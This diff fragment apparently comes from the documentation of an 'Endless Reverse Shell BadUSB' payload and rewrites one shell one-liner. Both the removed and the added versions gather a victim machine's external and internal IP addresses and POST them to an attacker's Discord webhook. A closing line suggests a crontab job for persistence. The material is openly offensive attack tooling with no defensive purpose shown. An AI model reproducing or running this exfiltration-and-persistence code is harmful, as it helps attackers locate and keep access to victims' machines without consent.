@@ -35,7 +35,7 @@ Then, send the external and internal IP addresses of the machine to a Discord ch
 
 
 
-`external_ip=$(curl -s [ifconfig.me](http://ifconfig.me/)); internal_ips=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | sed 's/inet //' | paste -sd "," -); json_payload="{\"content\": \"From Endless Reverse Shell BadUSB:\\nExternal IP: $external_ip\\nInternal IP(s): $(echo $internal_ips | sed 's/,/, /g')\\n----------------------------------------\"}"; curl -X POST -H "Content-Type: application/json" -d "$json_payload" "YOUR_DISCORD_CHANNEL_TOKEN" && unset external_ip internal_ips`
+`curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"From Endless Reverse Shell BadUSB:\\nExternal IP: $(curl -s 'https://api.ipify.org')\\nInternal IP(s): $(ifconfig | grep -Eo 'inet (addr:)?([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v '127.0.0.1' | sed 's/inet addr://' | sed 's/inet //' | paste -sd ',' - | sed 's/,/, /g')\\n----------------------------------------\"}" "YOUR_DISCORD_CHANNEL_TOKEN"`
 
 Not part of the Ducky Payload. For increased persistence, set the command as a crontab job (TCC permission is needed):
 
